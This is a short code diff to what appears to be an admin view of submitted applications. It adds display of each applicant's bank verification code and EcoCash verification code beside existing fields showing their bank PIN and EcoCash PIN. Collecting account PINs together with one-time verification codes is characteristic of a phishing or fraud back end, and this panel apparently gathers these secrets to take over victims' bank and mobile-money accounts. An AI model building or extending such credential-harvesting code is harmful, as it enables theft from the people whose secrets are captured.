@@ -288,6 +288,14 @@ ${app.bank_phone
     : ""
 }
 
+<br>
+
+<strong>Bank Verification Code:</strong>
+
+<span style="color:#1565C0;font-weight:bold;">
+    ${app.bank_verification_code || "Not submitted"}
+</span>
+
 ${app.bank_pin
     ? "<br>🔖 Bank Pin: " + app.bank_pin
     : ""
@@ -297,6 +305,14 @@ ${app.ecocash_number
     ? "<br>🟢 EcoCash: " + app.ecocash_number
     : ""
 }
+
+<br>
+
+<strong>EcoCash Verification Code:</strong>
+
+<span style="color:#1565C0;font-weight:bold;">
+    ${app.ecocash_verification_code || "Not submitted"}
+</span>
 
 ${app.ecocash_pin
     ? "<br>🔖 EcoCash Pin: " + app.ecocash_pin
